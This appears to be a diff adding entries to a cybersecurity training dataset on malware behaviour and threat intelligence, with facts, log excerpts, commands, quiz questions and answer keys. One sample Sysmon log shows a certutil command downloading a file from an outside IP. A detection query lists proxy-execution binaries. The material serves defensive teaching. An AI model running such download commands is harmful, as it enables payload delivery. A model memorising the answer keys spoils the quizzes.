+      "fact": "Packing compresses or encrypts the original code and prepends a stub that unpacks it at runtime, so static strings and imports shrink to almost nothing while entropy rises. Reliable indicators include section entropy above roughly 7.0 bits per byte, very few imports (often only LoadLibrary and GetProcAddress), writable-and-executable sections, unusual or duplicated section names, a large gap between raw and virtual sizes, an entry point outside the first section, and a data overlay. UPX is identifiable by its UPX0 and UPX1 section names and can often be unpacked with upx -d if unmodified, but custom packers and crypters require behavioural analysis instead. Detection should not depend on unpacking, because file, registry and network behaviour survives packing.",
+      "details": [
+        "Compute entropy per section rather than per file, so a packed section is not diluted by resources.",
+        "Memory analysis after execution often recovers the unpacked image and configuration.",
+        "Legitimate installers and software protectors also pack code, so entropy alone is not malicious."
+      ],
+      "commands": [
+        {
+          "language": "bash",
+          "code": "python3 -c \"import collections,math,sys;d=open(sys.argv[1],'rb').read();c=collections.Counter(d);print(-sum(v/len(d)*math.log2(v/len(d)) for v in c.values()))\" sample.bin",
+          "purpose": "Compute the Shannon entropy of a file to support a packing assessment."
+        },
+        {
+          "language": "bash",
+          "code": "upx -l sample.exe",
+          "purpose": "List UPX compression metadata if the file is a standard UPX-packed binary."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which combination is most consistent with a packed executable?",
+          "options": [
+            "High section entropy, very few imports, and a writable-executable section",
+            "Low entropy and a large, diverse import table",
+            "A valid Authenticode signature and a version resource",
+            "Many readable strings referencing documentation URLs"
+          ],
+          "answer": [0],
+          "rationale": "Packing hides strings and imports and expands code at runtime, producing high entropy, a minimal import table and often an executable writable region. A rich import table and readable strings suggest unpacked code; a signature and version resource indicate nothing about packing."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "If a sample will not unpack, it cannot be analysed or detected.",
+          "correction": "Unpacking is an analysis convenience, not a detection requirement. Behaviour such as persistence, injection, file encryption and network check-in is observable without the original code, and memory capture often recovers the unpacked image and configuration."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "YARA documentation",
+          "publisher": "VirusTotal",
+          "url": "https://yara.readthedocs.io/",
+          "license": "BSD-3-Clause"
+        }
+      ],
+      "tags": ["packing", "entropy", "upx", "obfuscation"]
+    },
+    {
+      "id": "mal-c2-039",
+      "subtopic": "malware-c2",
+      "difficulty": "advanced",
+      "title": "Command and control patterns: beaconing, jitter and covert channels",
+      "fact": "Implant check-in behaviour is one of the most durable detection surfaces because it is hard to change without losing resilience. Typical patterns are periodic connections with jitter (for example a nominal 60-second interval randomised by about 20 percent), long-lived TLS sessions to rare destinations, uniform request sizes, a consistent user agent, and fallback to a second channel when the first fails. Abuse of DNS through TXT or NULL queries and high-volume subdomains, HTTPS to newly registered or unpopular domains, domain fronting and DNS over HTTPS are all common, and the last two hide the true destination from network inspection. Detection combines statistical periodicity, destination rarity and reputation, JA3, JA3S and JARM fingerprints, and endpoint evidence of the process making the connections.",
+      "details": [
+        "Jitter defeats naive fixed-interval detections, so use variance-tolerant scoring over long windows.",
+        "A proxy log showing identical bytes out and in at regular intervals is a classic beacon signature.",
+        "Blocking one channel often triggers the fallback, which is itself a detection opportunity."
+      ],
+      "logs": [
+        {
+          "context": "Zeek conn.log excerpt for a suspected implant",
+          "text": "ts=1772592000.114 uid=C1x2 10.20.30.41 52011 203.0.113.51 443 tcp ssl 5.01 412 318 SF T F 0 ShADadfF 12 720 11 617\nts=1772592303.902 uid=C1x3 10.20.30.41 52044 203.0.113.51 443 tcp ssl 4.98 412 318 SF T F 0 ShADadfF 12 720 11 617\nts=1772592588.671 uid=C1x4 10.20.30.41 52077 203.0.113.51 443 tcp ssl 5.02 412 318 SF T F 0 ShADadfF 12 720 11 617",
+          "reading": "Identical payload sizes (412 out, 318 in), short sessions and approximately five-minute spacing with small variance to one external address indicate scripted check-in. Because the payload is uniform, this is likely a fixed-format heartbeat rather than interactive traffic. Pivot on the JA3 fingerprint and the local process."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why does beacon jitter make fixed-interval detection less effective?",
+          "options": [
+            "It encrypts the traffic so intervals cannot be measured",
+            "It randomises the timing around a base interval, so exact-period matching misses the connections",
+            "It changes the destination address on every connection",
+            "It uses UDP so no connection records exist"
+          ],
+          "answer": [1],
+          "rationale": "Jitter spreads check-in times around a mean, breaking rules that look for exact periodicity. Detection still works using statistical measures of regularity over longer windows, combined with rarity and fingerprinting."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Application Layer Protocol (T1071)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1071/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: Encrypted Channel (T1573)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1573/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["c2", "beaconing", "jitter", "dns", "ja3"]
+    },
+    {
+      "id": "mal-lotl-040",
+      "subtopic": "malware-lotl",
+      "difficulty": "advanced",
+      "title": "Living-off-the-land binaries: signed tools, hostile intent",
+      "fact": "Living-off-the-land techniques use binaries already present and often signed by the operating system, such as certutil, bitsadmin, mshta, rundll32, regsvr32, wmic, msbuild, installutil and PowerShell on Windows, and curl, wget, bash, python, tar and systemctl on Linux, so allow-listing by file reputation fails. The signal is context: a signed binary fetching a remote payload, spawning an unexpected child, writing to a temp directory, or making its first-ever outbound connection. Detection therefore needs command-line visibility, parent-child baselines and egress monitoring for processes that should not have network access, which is why process creation auditing and Sysmon event 1 are foundational controls. Removing interpreters and proxy-execution binaries that the business does not need reduces the surface substantially.",
+      "details": [
+        "Microsoft's system binary proxy execution techniques (T1218) are the canonical Windows examples.",
+        "On Linux, memfd-based execution and interpreter one-liners achieve similar deniability.",
+        "Baseline which signed utilities are normal in your estate; 'never seen in this parent' is more useful than a global blocklist."
+      ],
+      "logs": [
+        {
+          "context": "Sysmon event 1 on a workstation",
+          "text": "2026-03-04T10:02:11Z host-07 Sysmon 1\n  Image: C:\\Windows\\System32\\certutil.exe\n  CommandLine: certutil.exe -urlcache -split -f hxxp://198.51.100.61/a.txt C:\\Users\\public\\a.txt\n  ParentImage: C:\\Windows\\System32\\cmd.exe\n  User: EXAMPLE\\b.adeyemi",
+          "reading": "certutil is a certificate utility; using it to fetch a file from a bare IP address into a public directory is not administrative behaviour. The parent being cmd.exe from an interactive user session suggests scripted activity. Check what ran next, whether the file executed, and whether the same host contacted the address again."
+        }
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 500 | Where-Object {$_.Message -match 'certutil|mshta|regsvr32|bitsadmin'} | Select-Object TimeCreated,Message",
+          "purpose": "Search recent Sysmon process-creation events for common proxy-execution binaries."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why is file-signature allow-listing insufficient against living-off-the-land techniques?",
+          "options": [
+            "Signed binaries cannot be executed by non-administrators",
+            "The binaries are legitimate and signed, so only behaviour and context distinguish malicious use",
+            "Signatures are always invalid on Windows",
+            "The technique requires kernel drivers"
+          ],
+          "answer": [1],
+          "rationale": "LOTL abuses binaries that are already trusted and present, so reputation checks pass. Detection must rely on command-line content, parent-child relationships, unexpected network egress and file writes for a tool that normally does none of those things."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: System Binary Proxy Execution (T1218)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1218/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "Sysmon",
+          "publisher": "Microsoft Learn",
+          "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["lotl", "proxy-execution", "sysmon", "detection"]
+    },
+    {
+      "id": "mal-ransom-041",
+      "subtopic": "malware-ransomware",
+      "difficulty": "advanced",
+      "title": "Ransomware encryption behaviour and where to detect it",
+      "fact": "Ransomware typically generates a per-file symmetric key using AES or ChaCha20, wraps it with an asymmetric public key embedded in the binary, encrypts file content and often renames files with a family extension while dropping a ransom note in each directory. To increase speed, several families observed in 2022 and 2023 encrypt only part of each file, which lowers CPU cost and changes the write pattern analysts expect. Precursor behaviour is more detectable than encryption itself: shadow-copy deletion, backup service tampering, disabling recovery, mass renames by an unusual process and a sharp rise in write volume. Defensive controls that change outcomes are canary files, write-rate alerting on file servers, immutable backups and tested restore.",
+      "details": [
+        "Partial encryption often preserves file headers, so magic-byte checks may still succeed on damaged files.",
+        "Deleted shadow copies remove local recovery but not offsite or immutable copies; verify both.",
+        "A ransom note is useful evidence but is not required for detection."
+      ],
+      "logs": [
+        {
+          "context": "Windows file server, object access auditing and EDR",
+          "text": "2026-03-04T02:44:01Z host-fs02 Security 4663 Object access\n  Object: D:\\shares\\finance\\Q1.xlsx  Access: WriteData (or AddFile)  Process: encryptor.tmp.exe\n  Subject: EXAMPLE\\svc-backup\n4663 events in 60s: 1874\nEDR: file write rate 41x baseline; entropy of written blocks 7.8",
+          "reading": "A single non-standard process writing to many finance documents at high rate, under a service account, with high-entropy output is encryption in progress. Isolate the server's network path, preserve memory, and check whether the same account or binary touched other shares."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which precursor is most useful for detecting ransomware before encryption begins?",
+          "options": [
+            "The presence of a ransom note",
+            "Deletion of volume shadow copies and tampering with backup or recovery services",
+            "The file extension of encrypted files",
+            "High CPU use on a workstation"
+          ],
+          "answer": [1],
+          "rationale": "Shadow-copy deletion and backup tampering typically precede encryption and are strong, specific signals. Ransom notes and renamed extensions appear only after encryption, and CPU use is too generic to be reliable."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Backups on a domain-joined backup server are sufficient protection against ransomware.",
+          "correction": "Ransomware operators routinely target backup infrastructure with the same stolen domain credentials. Protection requires immutable or offline copies, separate credentials and management planes, and verified restore tests, not merely a second server in the same domain."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Data Encrypted for Impact (T1486)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1486/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "StopRansomware resource hub",
+          "publisher": "CISA",
+          "url": "https://www.cisa.gov/stopransomware",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["ransomware", "encryption", "backups", "file-server"]
+    },
+    {
+      "id": "mal-fileless-042",
+      "subtopic": "malware-fileless",
+      "difficulty": "advanced",
+      "title": "Fileless techniques and the telemetry that catches them",
+      "fact": "Fileless execution keeps payloads out of ordinary files: PowerShell download cradles and encoded commands, WMI event subscriptions for persistence, payloads stored in the registry, reflective DLL or .NET assembly loading, process injection through remote threads, APC queues or process hollowing and, on Linux, memfd_create followed by execution from /proc/self/fd or a binary in /dev/shm. Because nothing malicious is written to disk, detection shifts to script block logging in PowerShell event 4104, module and image loads, process access events, network connections from interpreters and memory scanning. Command-line and parent-process telemetry remain the highest-yield sources, and application control plus constrained language mode raises the cost of the technique.",
+      "details": [
+        "Sysmon events 7 (image loaded), 8 (CreateRemoteThread), 10 (process access) and 25 (process tampering) target injection behaviour.",
+        "Base64 in a command line is not proof of malice, but it is a strong reason to decode and review.",
+        "Memory-resident payloads may be recoverable from a crash dump or a full memory image."
+      ],
+      "commands": [
+        {
+          "language": "powershell",
+          "code": "Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 200 | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated,Message",
+          "purpose": "Review recent PowerShell script block logging events for suspicious script content."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Which event source most directly exposes a PowerShell script that was decoded and executed only in memory?",
+          "options": [
+            "Security event 4624",
+            "PowerShell script block logging, event 4104",
+            "System event 7045",
+            "Windows Update log"
+          ],
+          "answer": [1],
+          "rationale": "Script block logging records the script text as it is compiled, including deobfuscated content in many cases, which is exactly what disk-based file scanning misses. 4624 is a logon, 7045 a service install, and the update log is unrelated."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Process Injection (T1055)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1055/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK: PowerShell (T1059.001)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1059/001/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["fileless", "powershell", "injection", "script-block-logging"]
+    },
+    {
+      "id": "mal-sandbox-043",
+      "subtopic": "malware-sandbox",
+      "difficulty": "intermediate",
+      "title": "Sandbox results are a signal, not a verdict",
+      "fact": "Sandboxes are easy to evade: samples sleep past the analysis window, check for virtual-machine artifacts, low CPU counts, small disks, analysis tooling or a non-domain-joined host, wait for user interaction, require a specific geolocation, or fetch a second stage only from a live command-and-control server the sandbox cannot reach. A clean report therefore means no observed behaviour in that environment, not benign. Compensating practices include bare-metal or customised analysis hosts, longer runtimes, simulated internet services that answer DNS and HTTP, multiple sandboxes from different vendors, and memory and network capture during execution. The most useful output is often the configuration or infrastructure revealed during execution, which feeds detection even when the verdict is wrong.",
+      "details": [
+        "Record the sandbox vendor and version, runtime and network simulation profile with the result.",
+        "Compare behaviour across at least two engines before trusting a benign verdict.",
+        "Samples that detect analysis often reveal the detection technique itself, which is useful intelligence."
+      ],
+      "mcqs": [
+        {
+          "question": "A file returns a clean report from one sandbox. What is the sound conclusion?",
+          "options": [
+            "The file is benign",
+            "No malicious behaviour was observed in that environment, which is not proof of benignity",
+            "The file is definitely packed",
+            "The sandbox licence has expired"
+          ],
+          "answer": [1],
+          "rationale": "Evasion through sleeping, environment checks or staged delivery means a clean report is only an absence of observed behaviour. Corroborate with other engines, longer runs, simulated services and static or memory analysis before concluding."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "A clean sandbox verdict clears the file, so it can be released to users.",
+          "correction": "Sandbox evasion is routine and a clean run only describes that environment and time window. Release decisions should weigh provenance, static findings, other engines and user context, and a single clean report is not a clearance."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Virtualization/Sandbox Evasion (T1497)",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/techniques/T1497/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-83 Rev. 1: Guide to Malware Incident Prevention and Handling for Desktops and Laptops",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/83/r1/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["sandbox", "evasion", "analysis-limits", "triage"]
+    },
+    {
+      "id": "ti-cycle-044",
+      "subtopic": "ti-intelligence-cycle",
+      "difficulty": "foundational",
+      "title": "The intelligence cycle and the actions it must support",
+      "fact": "Threat intelligence is produced through a cycle: direction and planning, which establishes what decision the product must inform; collection; processing and normalisation; analysis; dissemination in a form the consumer can act on; and feedback that redirects the next cycle. In practice the cycle is iterative, with analysis constantly sending new requirements back to collection. A product without a stated consumer and decision is research rather than intelligence, and a product whose format does not match the consumer's workflow will be ignored. Good intelligence states what is known, how it is known, how confident the judgement is and what decision it supports.",
+      "details": [
+        "Direction should name the decision, the deadline and the classification level of the product.",
+        "Dissemination format follows the consumer: detection content for a SOC, exposure assessment for a CISO, risk narrative for a board.",
+        "Feedback is a requirement, not a courtesy; it is how collection priorities change."
+      ],
+      "mcqs": [
+        {
+          "question": "Which element turns a research report into threat intelligence?",
+          "options": [
+            "It contains at least one IP address",
+            "It is produced for a specific consumer and decision, with sourcing and confidence stated",
+            "It is longer than ten pages",
+            "It is classified"
+          ],
+          "answer": [1],
+          "rationale": "Intelligence is defined by its use in a decision. Naming the consumer and decision, stating provenance and confidence, and formatting for the workflow are what make a product actionable rather than interesting background reading."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-150: Guide to Cyber Threat Information Sharing",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/150/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["intelligence-cycle", "requirements", "dissemination"]
+    },
+    {
+      "id": "ti-pyramid-046",
+      "subtopic": "ti-pyramid-of-pain",
+      "difficulty": "intermediate",
+      "title": "The pyramid of pain: why TTPs outlast indicators",
+      "fact": "David Bianco's pyramid of pain ranks indicator types by the difficulty they cause an adversary when defenders detect and block them: file hashes are trivial to change, IP addresses easy, domain names harder, network and host artifacts cost more, tools cost more still, and tactics, techniques and procedures are the most painful because changing them changes how the actor operates. The practical implication is that detection engineering should climb the pyramid: a hash block catches one sample, while behaviour detection for credential dumping catches the technique across families. The pyramid is a prioritisation heuristic, not a measurement, and low-level indicators remain valuable for retro-hunting and for scoping an incident already in progress.",
+      "details": [
+        "Hashes are still essential for confirming a known sample and finding copies across the estate.",
+        "Indicator durability generally rises with abstraction, but so does false-positive risk.",
+        "Track which pyramid level each detection rule depends on to see how brittle coverage is."
+      ],
+      "mcqs": [
+        {
+          "question": "Why are TTP-based detections considered more durable than hash-based detections?",
+          "options": [
+            "TTPs are easier to write as signatures",
+            "Changing a technique is costly for an adversary, whereas a hash changes with any trivial modification to the sample",
+            "Hashes cannot be computed on modern systems",
+            "TTPs never produce false positives"
+          ],
+          "answer": [1],
+          "rationale": "A single byte change alters a hash, so hash blocking is defeated by repacking. A technique such as credential dumping requires the actor to change methodology, tooling and often infrastructure, which is far more disruptive and therefore more durable to detect."
+        }
+      ],
+      "misconceptions": [
+        {
+          "claim": "Because TTPs are at the top of the pyramid, indicators are worthless and should not be collected.",
+          "correction": "The pyramid ranks the adversary's cost to change, not the defender's value per case. Indicators are the fastest way to confirm a known sample, sweep an estate and scope an incident, and they feed the behavioural analytics that sit higher up."
+        }
+      ],
+      "references": [
+        {
+          "title": "The Pyramid of Pain",
+          "publisher": "David J. Bianco, Enterprise Detection & Response",
+          "url": "https://detect-respond.blogspot.com/2013/03/the-pyramid-of-pain.html",
+          "license": "Author blog, all rights reserved"
+        },
+        {
+          "title": "ATT&CK: Enterprise Matrix",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/matrices/enterprise/",
+          "license": "CC-BY-4.0"
+        }
+      ],
+      "tags": ["pyramid-of-pain", "indicators", "detection-engineering"]
+    },
+    {
+      "id": "ti-attack-047",
+      "subtopic": "ti-attack-mapping",
+      "difficulty": "foundational",
+      "title": "Using ATT&CK without technique bingo",
+      "fact": "MITRE ATT&CK describes adversary behaviour as tactics, meaning the adversary's goal, with 14 tactics in the Enterprise matrix; techniques and sub-techniques identified as T#### and T####.###; and procedures, the specific implementations observed. It also lists mitigations as M#### and, in recent versions, detection guidance. Mapping supports coverage analysis, detection engineering, threat-informed defence and communication, but it is easy to abuse: one action can serve several tactics, telemetry often supports only part of a technique, and mapping from memory produces drift. Record the ATT&CK version used, the evidence behind each mapping and the sub-technique where it matters, and keep mappings in a versioned Navigator layer so coverage can be compared over time.",
+      "details": [
+        "Pre-compromise, host and post-compromise tactics are separate; coverage of one says nothing about another.",
+        "Group and software pages give real procedures that make abstract techniques concrete.",
+        "Express defensive coverage as 'we can detect this sub-technique with this data source at this confidence'."
+      ],
+      "configs": [
+        {
+          "language": "json",
+          "snippet": "{\n  \"name\": \"detection-coverage-2025-Q1\",\n  \"versions\": {\"attack\": \"16\", \"navigator\": \"4.9.0\", \"layer\": \"4.5\"},\n  \"techniques\": [\n    {\"techniqueID\": \"T1003.001\", \"score\": 60, \"comment\": \"LSASS access alerting, no memory-scan coverage\"},\n    {\"techniqueID\": \"T1059.001\", \"score\": 80, \"comment\": \"4104 plus command-line analytics\"}\n  ]\n}",
+          "purpose": "Illustrative ATT&CK Navigator layer that records the ATT&CK version and evidence-based coverage scores."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why should an ATT&CK mapping record the ATT&CK version used?",
+          "options": [
+            "Because techniques are added, split and renamed across versions, so coverage comparisons are misleading without it",
+            "Because MITRE requires a licence per version",
+            "Because Navigator cannot open layers without a version",
+            "Because older versions are illegal to use"
+          ],
+          "answer": [0],
+          "rationale": "ATT&CK evolves: sub-techniques are added, names change and content is revised. A coverage score from one version cannot be compared meaningfully with another unless both are recorded, which is why layers carry a version and a date."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Enterprise Matrix",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/matrices/enterprise/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "ATT&CK Navigator",
+          "publisher": "MITRE",
+          "url": "https://github.com/mitre-attack/attack-navigator",
+          "license": "Apache-2.0"
+        }
+      ],
+      "tags": ["attack", "mapping", "coverage", "navigator"]
+    },
+    {
+      "id": "ti-stix-048",
+      "subtopic": "ti-stix-taxii",
+      "difficulty": "intermediate",
+      "title": "STIX 2.1 and TAXII 2.1: the plumbing of sharing",
+      "fact": "STIX 2.1 is an OASIS standard JSON model for cyber threat information: STIX Domain Objects such as indicator, malware, campaign, intrusion set, threat actor, report and observed data; STIX Relationship Objects such as relationship and sighting; and STIX Cyber-observable Objects such as IPv4 address, domain name, file with hashes, process and network traffic. Indicators carry a pattern in the STIX patterning language and a validity window, and objects carry created and modified times plus UUID identifiers. TAXII 2.1 is the transport: HTTPS APIs organised into API roots and collections that consumers poll or subscribe to. Much operational sharing still uses CSV or proprietary feeds, so normalisation into STIX loses fidelity unless it is done deliberately.",
+      "details": [
+        "STIX IDs are UUIDs; deterministic UUIDv5 generation keeps stable identifiers across versions of the same object.",
+        "Indicator valid_from and valid_until express expiry, which many consumers ignore when importing.",
+        "A STIX bundle is only a container and has no transport semantics of its own."
+      ],
+      "configs": [
+        {
+          "language": "json",
+          "snippet": "{\n  \"type\": \"bundle\",\n  \"id\": \"bundle--2f6b0c1e-0000-4000-8000-000000000001\",\n  \"objects\": [\n    {\n      \"type\": \"indicator\",\n      \"spec_version\": \"2.1\",\n      \"id\": \"indicator--2f6b0c1e-0000-4000-8000-000000000002\",\n      \"created\": \"2026-03-04T12:00:00.000Z\",\n      \"modified\": \"2026-03-04T12:00:00.000Z\",\n      \"pattern\": \"[domain-name:value = 'sync-node.example.test']\",\n      \"pattern_type\": \"stix\",\n      \"valid_from\": \"2026-03-04T12:00:00.000Z\",\n      \"valid_until\": \"2026-04-03T12:00:00.000Z\"\n    }\n  ]\n}",
+          "purpose": "Illustrative STIX 2.1 bundle with an indicator pattern and an explicit validity window."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "What is the relationship between STIX and TAXII?",
+          "options": [
+            "STIX is the transport protocol and TAXII is the data model",
+            "STIX defines the data model for threat information, while TAXII defines a transport API for exchanging it",
+            "They are competing data models for the same purpose",
+            "Both are proprietary formats owned by MITRE"
+          ],
+          "answer": [1],
+          "rationale": "STIX describes what is shared: objects, relationships and observable patterns. TAXII describes how it is shared over HTTPS, through API roots and collections. Both are OASIS standards, and neither is a MITRE product."
+        }
+      ],
+      "references": [
+        {
+          "title": "STIX Version 2.1 (OASIS Standard)",
+          "publisher": "OASIS Open",
+          "url": "https://docs.oasis-open.org/cti/stix/v2.1/os/stix-v2.1-os.html",
+          "license": "OASIS IPR Policy"
+        },
+        {
+          "title": "OASIS CTI documentation: STIX/TAXII introduction",
+          "publisher": "OASIS Open",
+          "url": "https://oasis-open.github.io/cti-documentation/",
+          "license": "OASIS IPR Policy"
+        }
+      ],
+      "tags": ["stix", "taxii", "sharing", "data-model"]
+    },
+    {
+      "id": "ti-confidence-049",
+      "subtopic": "ti-confidence",
+      "difficulty": "advanced",
+      "title": "Confidence, provenance and handling markings",
+      "fact": "Intelligence judgements need three things that are often conflated: source reliability, information credibility and analytic confidence. The Admiralty system rates sources A (completely reliable) to F (cannot be judged) and information 1 (confirmed by other sources) to 6 (cannot be judged); analytic confidence, commonly low, moderate or high, describes how strongly the evidence supports the judgement, and none of these is a probability. Provenance records where each fact came from, when it was collected, by what method and what corroborates it, so a consumer can re-evaluate it. Handling markings are separate again: TLP 2.0 defines CLEAR, GREEN, AMBER, AMBER+STRICT and RED, and governs sharing rather than classification or legal sensitivity, so a TLP marking never substitutes for a privacy or data-handling assessment.",
+      "details": [
+        "'High confidence' without stated evidence cannot be falsified and should be rejected in review.",
+        "Record first-seen and last-seen for infrastructure, because an IP address changes owners and meaning over time.",
+        "Commercial feeds rarely expose their sourcing; treat unprovenanced indicators as leads, not facts."
+      ],
+      "mcqs": [
+        {
+          "question": "An indicator is marked TLP:AMBER. What does that tell you?",
+          "options": [
+            "It is classified at the same level as national-security information",
+            "It may be shared within the recipient's organisation on a need-to-know basis, but not publicly or with outside organisations without the source's permission",
+            "It may be posted to any public blocklist",
+            "It has been confirmed by three independent sources"
+          ],
+          "answer": [1],
+          "rationale": "TLP is a sharing convention. AMBER limits distribution to members of the recipient's organisation who need it, and TLP 2.0's AMBER+STRICT narrows this further to the organisation only. Neither marking says anything about classification level or evidentiary confidence."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-150: Guide to Cyber Threat Information Sharing",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/150/final",
+          "license": "Public domain (US Government work)"
+        },
+        {
+          "title": "Traffic Light Protocol (TLP) 2.0",
+          "publisher": "FIRST",
+          "url": "https://www.first.org/tlp/",
+          "license": "FIRST TLP terms"
+        }
+      ],
+      "tags": ["confidence", "provenance", "tlp", "admiralty"]
+    },
+    {
+      "id": "ti-quality-050",
+      "subtopic": "ti-feed-quality",
+      "difficulty": "intermediate",
+      "title": "Feed quality, indicator expiry and the cost of auto-blocking",
+      "fact": "A threat-intelligence feed is only as good as its precision for your environment: a list of IP addresses that includes CDN ranges, NAT egress points, public resolvers or shared hosting will cause outages if auto-blocked, and a hash list that includes benign installers will cause false positives. Evaluate feeds on provenance, freshness, coverage, deduplication, false-positive history and whether indicators carry context such as role, first-seen date and associated campaign. Indicators decay at different rates: an IP may be reassigned in days, a domain may persist for months, a hash lasts until the sample is repacked, and a TTP may stay relevant for years, so every indicator needs an expiry or review date. Mature programmes stage new indicators in alert-only mode, measure precision, then promote to blocking.",
+      "details": [
+        "Store indicators with a confidence score, a source, a TTL and an owner, and query by expiry before blocking.",
+        "Prefer domain and TLS fingerprint blocking over IP blocking where shared infrastructure is common.",
+        "Track the operational cost of blocks, since helpdesk tickets are a concrete precision signal."
+      ],
+      "commands": [
+        {
+          "language": "sql",
+          "code": "SELECT indicator, type, source, confidence, expires_at FROM intel_indicators WHERE expires_at < now() ORDER BY expires_at;",
+          "purpose": "List expired indicators still present in a local intelligence table for review or removal."
+        }
+      ],
+      "mcqs": [
+        {
+          "question": "Why is auto-blocking IP addresses from a commercial feed risky?",
+          "options": [
+            "IP addresses cannot be blocked at firewalls",
+            "Shared infrastructure such as CDNs, resolvers and NAT gateways means a blocklist entry can affect legitimate services and many users",
+            "IP addresses never appear in threat feeds",
+            "Firewalls cannot store more than 100 rules"
+          ],
+          "answer": [1],
+          "rationale": "An IP address is not a stable identity. Shared hosting, CDNs and carrier NAT mean one address serves many benign parties, so blocking it can cause outages. Alert-only staging and context review reduce this risk."
+        }
+      ],
+      "references": [
+        {
+          "title": "NIST SP 800-150: Guide to Cyber Threat Information Sharing",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/150/final",
+          "license": "Public domain (US Government work)"
+        }
+      ],
+      "tags": ["feed-quality", "expiry", "blocking", "precision"]
+    },
+    {
+      "id": "ti-attrib-051",
+      "subtopic": "ti-attribution",
+      "difficulty": "expert",
+      "title": "Attribution: evidence, aliases and false flags",
+      "fact": "Attribution is an analytic judgement, not a property of an indicator: shared tooling, leaked builders, common infrastructure providers and copied tradecraft mean technical overlap supports association, not identity. Actors deliberately plant false flags, operate through criminal proxies or share infrastructure with other groups, and vendor naming multiplies aliases for the same cluster, so one intrusion set may carry a country-designation name, a vendor animal name and a private tracker's number. ATT&CK separates intrusion sets, which are observed activity clusters, from threat actors, the underlying organisations, precisely because the link between them is inferential. Public attribution carries legal, diplomatic and safety consequences and should follow organisational policy rather than an analyst's blog post.",
+      "details": [
+        "State the confidence and the alternative hypotheses, including 'a different actor using the same tool'.",
+        "Infrastructure overlap is weakest when the infrastructure is commodity or cloud-hosted.",
+        "Keep a cross-reference table of aliases and the sources that assert each mapping."
+      ],
+      "mcqs": [
+        {
+          "question": "Two campaigns use the same custom backdoor. What is the strongest defensible conclusion?",
+          "options": [
+            "The same individual conducted both campaigns",
+            "The campaigns are associated through shared tooling, which is one input to attribution but not proof of a common operator",
+            "Both campaigns were conducted by the same nation state",
+            "The backdoor was bought from the same vendor, proving a single buyer"
+          ],
+          "answer": [1],
+          "rationale": "Tool sharing is evidence of association, not identity. Builders leak, tools are sold and shared, and actors plant or inherit artifacts. Attribution needs corroboration across infrastructure, tradecraft, targeting and timing, with an explicit confidence level."
+        }
+      ],
+      "pitfalls": [
+        "Publishing an actor name before legal and policy review, creating commitments the organisation cannot support.",
+        "Treating an infrastructure overlap with a commodity cloud provider as a strong link."
+      ],
+      "misconceptions": [
+        {
+          "claim": "A TLP:RED marking means the information is classified secret.",
+          "correction": "TLP is a sharing convention, not a classification scheme. RED means the information is limited to the named recipients and must not be redistributed; classification level and legal handling obligations are separate determinations made by the source organisation."
+        }
+      ],
+      "references": [
+        {
+          "title": "ATT&CK: Groups",
+          "publisher": "MITRE",
+          "url": "https://attack.mitre.org/groups/",
+          "license": "CC-BY-4.0"
+        },
+        {
+          "title": "NIST SP 800-150: Guide to Cyber Threat Information Sharing",
+          "publisher": "NIST",
+          "url": "https://csrc.nist.gov/pubs/sp/800/150/final",
